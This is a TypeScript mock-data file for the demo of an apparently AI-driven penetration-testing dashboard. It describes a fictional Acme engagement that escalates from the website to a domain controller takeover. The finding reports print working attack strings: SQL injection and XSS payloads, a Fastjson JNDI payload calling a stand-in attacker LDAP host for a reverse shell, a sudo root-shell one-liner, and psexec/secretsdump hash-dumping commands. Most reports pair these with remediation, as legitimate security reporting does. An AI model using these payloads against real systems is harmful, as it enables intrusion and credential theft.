@@ -1,0 +1,4393 @@
+// Rich mock dataset for the Vercel demo (NEXT_PUBLIC_MOCK=1). Shapes track the
+// current backend contract in lib/api.ts + lib/types.ts. All data is static and
+// self-consistent (one company "Acme", a few tasks, findings, exploration graph,
+// sessions/activity, traffic, agents, etc.) so every page looks populated.
+
+import type {
+  Activity,
+  Agent,
+  AgentDetail,
+  Asset,
+  Audit,
+  Company,
+  Conversation,
+  ConvTokenSummary,
+  DailyTokenBucket,
+  Edge,
+  Finding,
+  FindingAsset,
+  InterceptApprovalRow,
+  InterceptAudit,
+  InterceptPending,
+  InterceptRule,
+  LLMPoolStatus,
+  LLMProfile,
+  LLMTask,
+  MCPServer,
+  MCPTool,
+  MissingSkill,
+  PromptVar,
+  PromptVersion,
+  SessionTokenUsage,
+  Settings,
+  SkillCall,
+  SkillItem,
+  Stats,
+  Task,
+  TaskCategory,
+  TaskNode,
+  TaskTemplate,
+  TokenTotal,
+  TokenUsage,
+  Tool,
+  TrafficDetail,
+  TrafficHost,
+  TrafficResp,
+} from "@/lib/types";
+
+const T = (iso: string) => iso; // readability helper for timestamps
+
+// ── Tasks ──────────────────────────────────────────────────────────────────
+export const ACTIVE_TASK = "t-acme-web";
+
+export const tasks: Task[] = [
+  {
+    id: "t-acme-web",
+    category_id: 1,
+    category_name: "External Assessment",
+    description: "External penetration test of Acme's official site and admin back office (acme.com)",
+    goal: "Gain administrator access to the acme.com back office and determine whether sensitive user data can be read.",
+    status: "running",
+    created_at: T("2026-07-24T09:12:00Z"),
+    created_unix: 1785489120,
+    last_activity: T("2026-07-26T03:58:22Z"),
+    last_activity_unix: 1785643102,
+    paused: false,
+    active: true,
+    in_flight: 3,
+    findings: { critical: 1, high: 2, medium: 1, low: 0 },
+    stalled: false,
+    goals_total: 5,
+    goals_met: 2,
+    engine_mode: "exploring",
+    llm_profile_id: 1,
+    llm_profile_ids: [1, 2],
+    active_llm_profile_id: 1,
+    llm_failover_state: "ready",
+    source_task_ids: [],
+    tokens: { input_tokens: 1284500, output_tokens: 96320, cache_read_tokens: 890400, cache_write_tokens: 132000 },
+  },
+  {
+    id: "t-acme-api",
+    category_id: 2,
+    category_name: "API Specialized",
+    description: "api.acme.com authorization bypass and injection testing",
+    goal: "Assess authorization bypass (IDOR) and injection risk on the api.acme.com order/user endpoints.",
+    status: "running",
+    created_at: T("2026-07-25T14:05:00Z"),
+    created_unix: 1785592500,
+    last_activity: T("2026-07-26T03:40:10Z"),
+    last_activity_unix: 1785642010,
+    paused: false,
+    active: false,
+    in_flight: 2,
+    findings: { critical: 0, high: 1, medium: 1, low: 0 },
+    stalled: false,
+    goals_total: 4,
+    goals_met: 1,
+    engine_mode: "exploring",
+    llm_profile_id: 1,
+    llm_profile_ids: [1, 2],
+    active_llm_profile_id: 1,
+    llm_failover_state: "ready",
+    source_task_ids: ["t-acme-web"],
+    tokens: { input_tokens: 642300, output_tokens: 51200, cache_read_tokens: 401000, cache_write_tokens: 60000 },
+  },
+  {
+    id: "t-shop-pay",
+    category_id: 2,
+    category_name: "API Specialized",
+    description: "shop.acme.com payment and order flow",
+    goal: "Assess authorization bypass, amount tampering, and race-condition risk on the payment/order endpoints.",
+    status: "paused",
+    created_at: T("2026-07-22T08:30:00Z"),
+    created_unix: 1785313800,
+    last_activity: T("2026-07-23T18:40:10Z"),
+    last_activity_unix: 1785436810,
+    paused: true,
+    active: false,
+    in_flight: 0,
+    stalled: false,
+    goals_total: 4,
+    goals_met: 1,
+    engine_mode: "paused",
+    llm_profile_id: 2,
+    llm_profile_ids: [2, 1],
+    active_llm_profile_id: 2,
+    llm_failover_state: "ready",
+    source_task_ids: ["t-acme-web", "t-acme-api"],
+    tokens: { input_tokens: 233000, output_tokens: 18700, cache_read_tokens: 120000, cache_write_tokens: 22000 },
+  },
+  {
+    id: "t-vpn-edge",
+    category_id: 1,
+    category_name: "External Assessment",
+    description: "External attack-surface reconnaissance (VPN / perimeter services)",
+    goal: "Identify exploitable perimeter services that acme.com exposes externally.",
+    status: "done",
+    created_at: T("2026-07-18T08:00:00Z"),
+    created_unix: 1784966400,
+    completed_at: T("2026-07-20T22:11:00Z"),
+    completed_unix: 1785190260,
+    last_activity: T("2026-07-20T22:11:00Z"),
+    last_activity_unix: 1785190260,
+    paused: false,
+    active: false,
+    in_flight: 0,
+    stalled: false,
+    goals_total: 3,
+    goals_met: 3,
+    engine_mode: "idle",
+    llm_profile_id: 1,
+    llm_profile_ids: [1],
+    active_llm_profile_id: 1,
+    llm_failover_state: "ready",
+    source_task_ids: [],
+    tokens: { input_tokens: 512000, output_tokens: 40100, cache_read_tokens: 300000, cache_write_tokens: 41000 },
+  },
+];
+
+export const taskCategories: TaskCategory[] = [
+  {
+    id: 1,
+    name: "External Assessment",
+    task_count: 2,
+    created_at: T("2026-07-18T08:00:00Z"),
+    updated_at: T("2026-07-25T08:00:00Z"),
+  },
+  {
+    id: 2,
+    name: "API Specialized",
+    task_count: 2,
+    created_at: T("2026-07-19T08:00:00Z"),
+    updated_at: T("2026-07-24T08:00:00Z"),
+  },
+];
+
+export const taskTemplates: TaskTemplate[] = [
+  {
+    id: 1,
+    name: "External Web Penetration",
+    description:
+      "Performs black-box penetration testing against the target's internet-facing surface, covering the site, endpoints, and common admin entry points.",
+    goal: "Identify and verify security issues that could lead to unauthenticated access, sensitive data exposure, or server takeover.",
+    created_at: T("2026-07-20T08:00:00Z"),
+    updated_at: T("2026-07-25T08:00:00Z"),
+  },
+  {
+    id: 2,
+    name: "API Authorization Bypass Specialized",
+    description:
+      "Performs specialized testing focused on the target API's authentication, object-level authorization, and role boundaries.",
+    goal: "Determine whether IDOR, horizontal privilege escalation, vertical privilege escalation, or bulk data access risks exist.",
+    created_at: T("2026-07-19T08:00:00Z"),
+    updated_at: T("2026-07-24T08:00:00Z"),
+  },
+];
+
+export const getTask = (id: string) => tasks.find((t) => t.id === id);
+
+const grandTotal: TokenTotal = tasks.reduce(
+  (a, t) => ({
+    input_tokens: a.input_tokens + (t.tokens?.input_tokens ?? 0),
+    output_tokens: a.output_tokens + (t.tokens?.output_tokens ?? 0),
+    cache_read_tokens: a.cache_read_tokens + (t.tokens?.cache_read_tokens ?? 0),
+    cache_write_tokens: a.cache_write_tokens + (t.tokens?.cache_write_tokens ?? 0),
+  }),
+  { input_tokens: 0, output_tokens: 0, cache_read_tokens: 0, cache_write_tokens: 0 },
+);
+
+// ── Stats ──────────────────────────────────────────────────────────────────
+export function stats(
+  taskId?: string,
+  state: { tasks?: readonly Task[]; findings?: readonly Finding[]; activeTask?: string } = {},
+): Stats & { active_task?: unknown } {
+  const taskList = state.tasks ?? tasks;
+  const findingList = state.findings ?? findings;
+  const base: Stats = {
+    assets: assets.length,
+    engine_mode: "exploring",
+    llm_configured: true,
+    roe_enabled: true,
+    findings_confirmed: findingList.filter((f) => f.severity !== "low").length,
+  };
+  const selectedTaskID = taskId ?? state.activeTask ?? ACTIVE_TASK;
+  const t = taskList.find((item) => item.id === selectedTaskID);
+  if (!t) return base;
+  return {
+    ...base,
+    engine_mode: t.engine_mode ?? "idle",
+    findings_confirmed: findingList.filter((f) => f.task_id === t.id).length,
+    active_task: {
+      id: t.id,
+      in_flight: t.in_flight,
+      goals_total: t.goals_total,
+      goals_met: t.goals_met,
+      engine_mode: t.engine_mode,
+      paused: t.paused,
+    },
+  };
+}
+
+// ── Company + Assets (new unified model) ─────────────────────────────────────
+export const companies: Company[] = [
+  {
+    id: 1,
+    name: "Acme Corp",
+    logo: "",
+    asset_count: 18,
+    scope: [
+      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "Primary domain" },
+      { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
+      { id: 3, company_id: 1, kind: "ip", net: "198.51.100.20", raw: "198.51.100.20" },
+    ],
+  },
+];
+
+export const assets: Asset[] = [
+  {
+    id: 1,
+    type: "root_domain",
+    company_id: 1,
+    task_ids: [1],
+    domain: "acme.com",
+    root_domain: "acme.com",
+    icp: "ICP-2021-XXXX",
+    record_type: "A",
+    record_value: ["203.0.113.10"],
+    last_seen: T("2026-07-26T02:00:00Z"),
+  },
+  {
+    id: 2,
+    type: "subdomain",
+    company_id: 1,
+    task_ids: [1],
+    domain: "www.acme.com",
+    root_domain: "acme.com",
+    record_type: "CNAME",
+    record_value: "acme.com",
+    last_seen: T("2026-07-26T02:01:00Z"),
+  },
+  {
+    id: 3,
+    type: "subdomain",
+    company_id: 1,
+    task_ids: [2],
+    domain: "api.acme.com",
+    root_domain: "acme.com",
+    record_type: "A",
+    record_value: ["203.0.113.11"],
+    last_seen: T("2026-07-26T02:02:00Z"),
+  },
+  {
+    id: 4,
+    type: "subdomain",
+    company_id: 1,
+    task_ids: [3],
+    domain: "shop.acme.com",
+    root_domain: "acme.com",
+    record_type: "A",
+    record_value: ["203.0.113.12"],
+    last_seen: T("2026-07-26T02:03:00Z"),
+  },
+  {
+    id: 5,
+    type: "subdomain",
+    company_id: 1,
+    task_ids: [4],
+    domain: "vpn.acme.com",
+    root_domain: "acme.com",
+    record_type: "A",
+    record_value: ["198.51.100.20"],
+    last_seen: T("2026-07-20T02:00:00Z"),
+  },
+  {
+    id: 6,
+    type: "subdomain",
+    company_id: 1,
+    task_ids: [1],
+    domain: "admin.acme.com",
+    root_domain: "acme.com",
+    record_type: "A",
+    record_value: ["203.0.113.10"],
+    last_seen: T("2026-07-26T02:04:00Z"),
+  },
+  {
+    id: 7,
+    type: "ip",
+    company_id: 1,
+    task_ids: [1, 2],
+    ip: "203.0.113.10",
+    c_segment: "203.0.113.0",
+    open_ports: [
+      { port: 80, service: "http" },
+      { port: 443, service: "https" },
+      { port: 22, service: "ssh" },
+    ],
+    last_seen: T("2026-07-26T02:05:00Z"),
+  },
+  {
+    id: 8,
+    type: "ip",
+    company_id: 1,
+    task_ids: [2],
+    ip: "203.0.113.11",
+    c_segment: "203.0.113.0",
+    open_ports: [{ port: 443, service: "https" }],
+    last_seen: T("2026-07-26T02:06:00Z"),
+  },
+  {
+    id: 9,
+    type: "ip",
+    company_id: 1,
+    task_ids: [4],
+    ip: "198.51.100.20",
+    c_segment: "198.51.100.0",
+    open_ports: [
+      { port: 443, service: "https" },
+      { port: 500, service: " isakmp" },
+    ],
+    last_seen: T("2026-07-20T02:00:00Z"),
+  },
+  {
+    id: 10,
+    type: "service",
+    company_id: 1,
+    task_ids: [1],
+    ip: "203.0.113.10",
+    port: 443,
+    service_type: "https",
+    service_name: "nginx/1.24.0",
+    last_seen: T("2026-07-26T02:07:00Z"),
+  },
+  {
+    id: 11,
+    type: "service",
+    company_id: 1,
+    task_ids: [4],
+    ip: "198.51.100.20",
+    port: 22,
+    service_type: "ssh",
+    service_name: "OpenSSH 8.9p1",
+    last_seen: T("2026-07-20T02:00:00Z"),
+  },
+  {
+    id: 12,
+    type: "app",
+    company_id: 1,
+    task_ids: [1],
+    url: "https://www.acme.com",
+    app_name: "Acme Official Site",
+    category: "corp",
+    status_code: 200,
+    content_length: 48213,
+    page_title: "Acme Corp - Corporate Site",
+    technologies: ["Nginx", "React", "Cloudflare"],
+    favicon_mmh3: "-1580860059",
+    last_seen: T("2026-07-26T02:08:00Z"),
+  },
+  {
+    id: 13,
+    type: "app",
+    company_id: 1,
+    task_ids: [1],
+    url: "https://admin.acme.com",
+    app_name: "Admin Back Office",
+    category: "admin",
+    status_code: 200,
+    content_length: 12044,
+    page_title: "Acme Admin Login",
+    technologies: ["Nginx", "Vue", "Element-UI"],
+    last_seen: T("2026-07-26T02:09:00Z"),
+  },
+  {
+    id: 14,
+    type: "app",
+    company_id: 1,
+    task_ids: [2],
+    url: "https://api.acme.com",
+    app_name: "REST API",
+    category: "api",
+    status_code: 401,
+    content_length: 45,
+    page_title: "",
+    technologies: ["Kong", "Node.js"],
+    last_seen: T("2026-07-26T02:10:00Z"),
+  },
+  {
+    id: 15,
+    type: "endpoint",
+    company_id: 1,
+    task_ids: [2],
+    url: "https://api.acme.com/v1/orders",
+    method: "GET",
+    status_code: 200,
+    params: [
+      { name: "id", in: "query" },
+      { name: "page", in: "query" },
+    ],
+    last_seen: T("2026-07-26T02:11:00Z"),
+  },
+  {
+    id: 16,
+    type: "endpoint",
+    company_id: 1,
+    task_ids: [2],
+    url: "https://api.acme.com/v1/users/me",
+    method: "GET",
+    status_code: 200,
+    last_seen: T("2026-07-26T02:12:00Z"),
+  },
+  {
+    id: 17,
+    type: "endpoint",
+    company_id: 1,
+    task_ids: [1],
+    url: "https://admin.acme.com/login",
+    method: "POST",
+    status_code: 200,
+    params: [{ name: "username" }, { name: "password" }],
+    last_seen: T("2026-07-26T02:13:00Z"),
+  },
+  {
+    id: 18,
+    type: "endpoint",
+    company_id: 1,
+    task_ids: [1],
+    url: "https://www.acme.com/search",
+    method: "GET",
+    status_code: 200,
+    params: [{ name: "q", in: "query" }],
+    last_seen: T("2026-07-26T02:14:00Z"),
+  },
+  // 内网资产（DMZ→内网横向发现）
+  {
+    id: 19,
+    type: "ip",
+    company_id: 1,
+    task_ids: [1],
+    ip: "10.0.20.15",
+    c_segment: "10.0.20.0",
+    open_ports: [
+      { port: 80, service: "http" },
+      { port: 22, service: "ssh" },
+    ],
+    last_seen: T("2026-07-25T15:40:00Z"),
+  },
+  {
+    id: 20,
+    type: "ip",
+    company_id: 1,
+    task_ids: [1],
+    ip: "10.10.10.10",
+    c_segment: "10.10.10.0",
+    open_ports: [
+      { port: 88, service: "kerberos" },
+      { port: 389, service: "ldap" },
+      { port: 445, service: "smb" },
+    ],
+    last_seen: T("2026-07-25T21:00:00Z"),
+  },
+  {
+    id: 21,
+    type: "ip",
+    company_id: 1,
+    task_ids: [1],
+    ip: "10.10.10.5",
+    c_segment: "10.10.10.0",
+    open_ports: [{ port: 445, service: "smb" }],
+    last_seen: T("2026-07-25T21:00:00Z"),
+  },
+  {
+    id: 22,
+    type: "ip",
+    company_id: 1,
+    task_ids: [1],
+    ip: "10.10.10.20",
+    c_segment: "10.10.10.0",
+    open_ports: [{ port: 8080, service: "http-proxy" }],
+    last_seen: T("2026-07-25T21:00:00Z"),
+  },
+  {
+    id: 23,
+    type: "service",
+    company_id: 1,
+    task_ids: [1],
+    ip: "10.10.10.20",
+    port: 8080,
+    service_type: "http",
+    service_name: "Jenkins 2.289",
+    last_seen: T("2026-07-25T21:35:00Z"),
+  },
+  {
+    id: 24,
+    type: "service",
+    company_id: 1,
+    task_ids: [1],
+    ip: "10.10.10.10",
+    port: 445,
+    service_type: "smb",
+    service_name: "Windows Server 2019 DC",
+    last_seen: T("2026-07-25T23:55:00Z"),
+  },
+  {
+    id: 25,
+    type: "app",
+    company_id: 1,
+    task_ids: [1],
+    url: "http://10.10.10.20:8080",
+    app_name: "Jenkins (Internal)",
+    category: "ci",
+    status_code: 200,
+    content_length: 14200,
+    page_title: "Jenkins Dashboard",
+    technologies: ["Jenkins", "Java"],
+    last_seen: T("2026-07-25T21:35:00Z"),
+  },
+  {
+    id: 26,
+    type: "endpoint",
+    company_id: 1,
+    task_ids: [1],
+    url: "http://10.10.10.20:8080/script",
+    method: "GET",
+    status_code: 200,
+    last_seen: T("2026-07-25T21:35:00Z"),
+  },
+];
+
+export const assetCounts: Record<string, number> = assets.reduce<Record<string, number>>((m, a) => {
+  m[a.type] = (m[a.type] ?? 0) + 1;
+  return m;
+}, {});
+
+// assetRef 把资产 id 变成 finding 上挂的资产引用(label 与后端 coverageNodeLabel
+// 的取值顺序一致:URL > 域名 > IP > 应用名)。「按资产」视图的树就是靠这些引用
+// 把发现挂到资产上的。
+function assetRef(id: number): FindingAsset {
+  const asset = assets.find((candidate) => candidate.id === id);
+  if (!asset) throw new Error(`mock assetRef: unknown asset ${id}`);
+  return {
+    id: String(id),
+    type: asset.type,
+    label: asset.url || asset.domain || asset.ip || asset.app_name || String(id),
+  };
+}
+
+// ── Findings ─────────────────────────────────────────────────────────────────
+export const findings: Finding[] = [
+  {
+    id: "f-1",
+    assets: [assetRef(18)],
+    vulnclass: "SQL Injection",
+    name: "Error-based SQL injection on the official site's search endpoint",
+    severity: "high",
+    status: "pending",
+    report:
+      '## Vulnerability Overview\n\nThe `q` parameter of `www.acme.com/search` is vulnerable to **error-based SQL injection** (MSSQL), allowing an attacker to read the database version and schema as well as sensitive data.\n\n## Impact\n\n- The table structure and user/order data in the `acme_prod` database can be read\n- Error messages are exposed as-is, making exploitation easy to script and raising the overall risk\n\n## Reproduction Steps\n\n1. Trigger the error-based injection:\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. Confirm injection is possible from the MSSQL version error exposed in the response\n3. Enumerate the database further: `sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## Remediation\n\n- Replace all queries with parameterized queries/prepared statements to eliminate string concatenation\n- Disable detailed error exposure in production\n- Minimize database account privileges and disable dangerous extensions such as `xp_cmdshell`\n',
+    summary: "Error-based SQL injection exists in the q parameter of www.acme.com/search",
+    evidence:
+      "GET /search?q=1' AND 1=CONVERT(int,@@version)-- returns an MSSQL version error message, allowing the database structure to be read.",
+    intent_id: "i-2",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-26T01:20:00Z"),
+  },
+  {
+    id: "f-2",
+    assets: [assetRef(15)],
+    vulnclass: "IDOR",
+    severity: "high",
+    status: "pending",
+    summary: "Authorization bypass on api.acme.com/v1/orders?id= allows viewing other users' orders",
+    evidence:
+      "Changing id=1001 to id=1002 returns another user's order (including shipping address and phone number), with no ownership check.",
+    intent_id: "i-5",
+    task_id: "t-acme-api",
+    task_description: "api.acme.com authorization bypass and injection testing",
+    ts: T("2026-07-26T02:44:00Z"),
+  },
+  {
+    id: "f-3",
+    assets: [assetRef(3)],
+    vulnclass: "Weak JWT",
+    severity: "high",
+    status: "pending",
+    summary: "The API JWT uses a weak key that can be cracked and forged offline",
+    evidence:
+      "HS256, key 'secret', cracked with john in 5 seconds → an arbitrary sub can be forged to bypass authorization.",
+    task_id: "t-acme-api",
+    task_description: "api.acme.com authorization bypass and injection testing",
+    ts: T("2026-07-26T03:02:00Z"),
+  },
+  {
+    id: "f-4",
+    assets: [assetRef(18)],
+    vulnclass: "Reflected XSS",
+    severity: "medium",
+    status: "pending",
+    summary: "The search page does not escape the q parameter, causing reflected XSS",
+    evidence: "q=<script>alert(document.domain)</script> is reflected as-is in the result title.",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-25T22:10:00Z"),
+  },
+  {
+    id: "f-5",
+    assets: [assetRef(2)],
+    vulnclass: "Exposed .git",
+    severity: "medium",
+    status: "pending",
+    summary: "www.acme.com exposes a .git directory, allowing source code recovery",
+    evidence:
+      "GET /.git/HEAD → 200; recovered backend source code and a database connection string comment using git-dumper.",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-25T20:30:00Z"),
+  },
+  {
+    id: "f-6",
+    assets: [assetRef(17)],
+    vulnclass: "Default Credentials",
+    severity: "high",
+    status: "pending",
+    summary: "admin.acme.com admin back office uses the default password admin/admin123",
+    evidence: "Logged in successfully and entered the admin back office, where users and orders can be managed.",
+    intent_id: "i-3",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-26T03:50:00Z"),
+  },
+  {
+    id: "f-7",
+    assets: [assetRef(17)],
+    vulnclass: "Open Redirect",
+    severity: "low",
+    status: "pending",
+    summary: "The next parameter after login allows redirecting to an arbitrary address",
+    evidence: "Logging in with /login?next=https://evil.example results in a 302 redirect to the external site.",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-25T19:12:00Z"),
+  },
+  {
+    id: "f-8",
+    assets: [assetRef(17)],
+    vulnclass: "Missing Rate Limit",
+    severity: "medium",
+    status: "pending",
+    summary: "The login endpoint has no rate limiting, allowing brute-force attacks",
+    evidence: "Sending 1,000 requests per minute does not trigger a lockout, and there is no CAPTCHA.",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-25T18:40:00Z"),
+  },
+  {
+    id: "f-9",
+    assets: [assetRef(16)],
+    vulnclass: "Verbose Error",
+    severity: "low",
+    status: "pending",
+    summary: "The API returns a stack trace on 500 errors, exposing paths and framework version",
+    evidence: "Triggering a 500 error returns a Node.js stack trace, exposing absolute paths and dependency versions.",
+    task_id: "t-acme-api",
+    task_description: "api.acme.com authorization bypass and injection testing",
+    ts: T("2026-07-25T23:05:00Z"),
+  },
+  {
+    id: "f-10",
+    assets: [assetRef(4)],
+    vulnclass: "Outdated Component",
+    severity: "medium",
+    status: "pending",
+    summary: "shop uses an outdated component with a known RCE",
+    evidence: "Fingerprinting identified component v2.3.1, which corresponds to the CVE-2024-xxxx deserialization RCE.",
+    task_id: "t-shop-pay",
+    task_description: "shop.acme.com payment and order flow",
+    ts: T("2026-07-23T15:00:00Z"),
+  },
+  // ── 外网→内网纵深链路上的高危发现（active task）──
+  {
+    id: "f-11",
+    vulnclass: "Hardcoded Credentials",
+    severity: "high",
+    status: "pending",
+    summary: "Hardcoded database credential sa/Acme@2021 found in leaked source code",
+    evidence:
+      "Recovered config.php by restoring www.acme.com/.git with git-dumper; it contained a plaintext DB password, later confirmed reusable on the internal network.",
+    intent_id: "ig",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-25T20:36:00Z"),
+  },
+  {
+    id: "f-12",
+    assets: [assetRef(4)],
+    vulnclass: "Deserialization RCE",
+    name: "Remote code execution via Fastjson deserialization in the shop storefront",
+    severity: "critical",
+    status: "confirmed",
+    report:
+      '## Vulnerability Overview\n\nThe `/api/import` endpoint on `shop.acme.com` parses user-controlled JSON with **Fastjson 1.2.24** without enabling `safeMode`, allowing an attacker to specify an arbitrary class via `@type` to trigger **JNDI injection → remote code execution**.\n\n## Impact\n\n- An attacker can execute arbitrary commands on the DMZ web server without authentication (`www-data@dmz-web01`)\n- Combined with subsequent privilege escalation, this becomes a foothold into the internal network\n\n## Reproduction Steps\n\n1. Build the JNDI payload:\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import`, `Content-Type: application/json`\n3. The target calls back via dnslog and a reverse shell is obtained\n\n## Remediation\n\n- Upgrade Fastjson to **1.2.83+** and enable `safeMode`\n- Add authentication and origin verification to `/api/import`\n- Restrict outbound traffic: prevent the application server from actively connecting out via LDAP/RMI\n',
+    summary: "shop.acme.com Fastjson 1.2.24 deserialization remote code execution",
+    evidence:
+      "Sending a JNDI payload (@type:JdbcRowSetImpl) via POST /api/import triggers a dnslog callback and drops a reverse shell (www-data@dmz-web01).",
+    intent_id: "i7",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-25T15:40:00Z"),
+  },
+  {
+    id: "f-13",
+    assets: [assetRef(19)],
+    vulnclass: "Privilege Escalation",
+    severity: "high",
+    status: "pending",
+    summary: "Local privilege escalation to root from the DMZ foothold via sudo NOPASSWD misconfiguration",
+    evidence:
+      "sudo -l shows (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' immediately obtains root.",
+    intent_id: "i8",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-25T16:20:00Z"),
+  },
+  {
+    id: "f-14",
+    assets: [assetRef(19), assetRef(21)],
+    vulnclass: "Network Segmentation",
+    severity: "medium",
+    status: "pending",
+    summary: "A DMZ host has dual NICs directly connected to the internal network, defeating segmentation",
+    evidence:
+      "dmz-web01's second NIC is on 10.10.10.0/24, giving direct reach from the DMZ to the domain controller/file server/Jenkins and bypassing network segmentation.",
+    intent_id: "i9",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-25T21:00:00Z"),
+  },
+  {
+    id: "f-15",
+    assets: [assetRef(26)],
+    vulnclass: "Unauthenticated RCE",
+    severity: "high",
+    status: "pending",
+    summary: "Unauthenticated Script Console remote code execution on internal Jenkins",
+    evidence:
+      "Executed Groovy without logging in via GET /script: 'whoami'.execute().text → SYSTEM; extracted the domain account acme\\svc_deploy from the credential store.",
+    intent_id: "i11",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-25T21:50:00Z"),
+  },
+  {
+    id: "f-16",
+    assets: [assetRef(21)],
+    vulnclass: "Kerberoasting",
+    severity: "high",
+    status: "pending",
+    summary: "Domain service account svc_sql is Kerberoastable and has a weak password",
+    evidence:
+      "Requested svc_sql's TGS via GetUserSPNs and cracked Sql@2020 offline with hashcat -m 13100. This account belongs to the SQL admin group.",
+    intent_id: "i12",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-25T23:20:00Z"),
+  },
+  {
+    id: "f-17",
+    assets: [assetRef(20)],
+    vulnclass: "Domain Compromise",
+    name: "Full compromise of internal domain controller DC01 (Domain Admin)",
+    severity: "critical",
+    status: "confirmed",
+    report:
+      "## Vulnerability Overview\n\nAfter establishing a DMZ foothold via the external Fastjson RCE, the domain account `svc_deploy` was obtained through sudo privilege escalation, dual-NIC traversal, and the unauthenticated Jenkins RCE. This account belongs to **Domain Admins**, resulting in a full takeover of domain controller **DC01**.\n\n## Impact\n\n- Domain admin privileges allow control over every host and account in the domain\n- `secretsdump` extracted the NTLM hashes for the entire domain (including `krbtgt`), enabling a golden ticket for long-term persistence\n- Internal objective achieved\n\n## Reproduction Steps\n\n1. Log in as `svc_deploy` and extract the hashes:\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. Obtain SYSTEM on DC01 and extract all domain hashes\n\n## Remediation\n\n- Reduce the service account's privileges, remove it from Domain Admins, and apply tiered administration\n- Reset `krbtgt` twice in succession and replace service account passwords with strong ones\n- Fix DMZ-to-internal network segmentation and the RCE/privilege-escalation chain described above\n",
+    summary: "Domain controller DC01 compromised (Domain Admin): internal objective achieved",
+    evidence:
+      "svc_deploy belongs to Domain Admins; logged into DC01 via psexec.py to obtain SYSTEM, then used secretsdump to extract the entire domain's NTLM hashes (including krbtgt), completing the objective.",
+    intent_id: "i13",
+    task_id: "t-acme-web",
+    task_description: "External penetration test of Acme's official site and admin back office",
+    ts: T("2026-07-26T00:20:00Z"),
+  },
+];
+
+// ── Exploration graph (active task) ──────────────────────────────────────────
+// 现行模型：根是 fact/state=origin（渲染为「起点」）；payload 为 JSON 字符串，
+// goal 取 text、其余取 summary。结构：根→目标(spawns)→意图(spawns)→事实/漏洞(yields)，
+// 漏洞→目标(proves)，提示→意图(derived_from)。
+const P = (o: Record<string, string>) => JSON.stringify(o);
+
+export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
+  nodes: [
+    {
+      id: "root",
+      type: "fact",
+      payload: P({ summary: "Root: acme.com deep penetration from external to internal network" }),
+      priority: 0,
+      state: "origin",
+      origin: "system",
+      ts: T("2026-07-24T09:12:00Z"),
+    },
+
+    // ── 目标（由 goals agent 拆解，随发现逐步加码到内网靶标）──
+    {
+      id: "g1",
+      type: "goal",
+      payload: P({ text: "Obtain acme.com admin back office access" }),
+      priority: 9,
+      state: "met",
+      origin: "goals",
+      ts: T("2026-07-24T09:13:00Z"),
+    },
+    {
+      id: "g2",
+      type: "goal",
+      payload: P({ text: "Access sensitive user data" }),
+      priority: 8,
+      state: "open",
+      origin: "goals",
+      ts: T("2026-07-24T09:13:00Z"),
+    },
+    {
+      id: "g3",
+      type: "goal",
+      payload: P({ text: "Breach the DMZ from the external network and establish an internal foothold" }),
+      priority: 9,
+      state: "met",
+      origin: "goals",
+      ts: T("2026-07-25T14:10:00Z"),
+    },
+    {
+      id: "g4",
+      type: "goal",
+      payload: P({
+        text: "Move laterally through the internal network and compromise the target domain controller DC01",
+      }),
+      priority: 10,
+      state: "met",
+      origin: "goals",
+      ts: T("2026-07-25T20:00:00Z"),
+    },
+
+    // ── 第 1 层 · 外网侦察 / 外部漏洞 ──
+    {
+      id: "i1",
+      type: "intent",
+      payload: P({ summary: "acme.com subdomain enumeration and port scanning" }),
+      priority: 6,
+      state: "done",
+      origin: "planner",
+      ts: T("2026-07-24T09:20:00Z"),
+    },
+    {
+      id: "i2",
+      type: "intent",
+      payload: P({ summary: "Testing default/weak passwords on the admin back office" }),
+      priority: 9,
+      state: "done",
+      origin: "planner",
+      ts: T("2026-07-26T03:30:00Z"),
+    },
+    {
+      id: "i3",
+      type: "intent",
+      payload: P({ summary: "Enumerating back-office features and user data endpoints" }),
+      priority: 8,
+      state: "running",
+      origin: "planner",
+      ts: T("2026-07-26T03:55:00Z"),
+    },
+    {
+      id: "i4",
+      type: "intent",
+      payload: P({ summary: "Detecting SQL injection on the www.acme.com/search page" }),
+      priority: 8,
+      state: "done",
+      origin: "planner",
+      ts: T("2026-07-25T22:00:00Z"),
+    },
+    {
+      id: "i5",
+      type: "intent",
+      payload: P({ summary: "Testing authorization bypass (IDOR) on the api.acme.com order endpoint" }),
+      priority: 8,
+      state: "running",
+      origin: "planner",
+      ts: T("2026-07-26T02:30:00Z"),
+    },
+    {
+      id: "ig",
+      type: "intent",
+      payload: P({ summary: "Extracting leaked source code and hardcoded credentials from www.acme.com .git" }),
+      priority: 7,
+      state: "done",
+      origin: "planner",
+      ts: T("2026-07-25T20:20:00Z"),
+    },
+
